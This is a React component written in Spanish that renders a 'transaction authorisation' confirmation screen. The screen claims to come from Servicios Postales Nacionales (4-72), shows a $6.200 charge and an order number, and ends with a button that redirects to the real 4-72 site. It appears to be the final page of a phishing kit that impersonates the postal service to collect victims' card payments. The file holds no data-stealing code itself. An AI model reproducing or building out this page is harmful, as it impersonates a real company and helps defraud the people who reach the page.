import React from 'react'
import { useState } from 'react';

const getRandomString = () => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const charactersLength = characters.length;
  
    for (let i = 0; i < 10; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
  
    return result;
  };

const Final = () => {


    const [randomString, setRandomString] = useState(getRandomString());

    const generateNewString = () => {
      setRandomString(getRandomString());
    };



  return (
    <>
        <div className='fondoAmarillo p-5'>
            <p className='uppercase cosoAzul'>Verificando</p>
            <p className='cosoAzul2'>Autorización de transacción</p>
            <p>La transacción que intentas realizar en <span className='cosoAzul2'>Servicios Postales Nacionales S.A.S</span> por valor de $6.200 puede requerir autorización ante su entidad bancaria en un maximo de 24 horas hábiles.</p>
            <p className='cosoAzul2'>Detalles de transacción</p>

            <p className=''><span className='cosoAzul2'>Comercio:</span>Servicios Postales Nacionales S.A.S</p>

            <p className=''><span className='cosoAzul2'>Número de Orden:  </span>ML207483833MH</p>

            <p className=''><span className='cosoAzul2'>Valor Total de Transacción:</span>$6.200</p>

            <div className='text-center mt-5 botonFinal'>
                <a href='https://www.4-72.com.co/' className='botonRojo py-2 m-auto px-12 text-white camelcase font-bold rounded-xl '>Finalizar</a>
            </div>
         

        </div>
    </>
  )
}

export default Final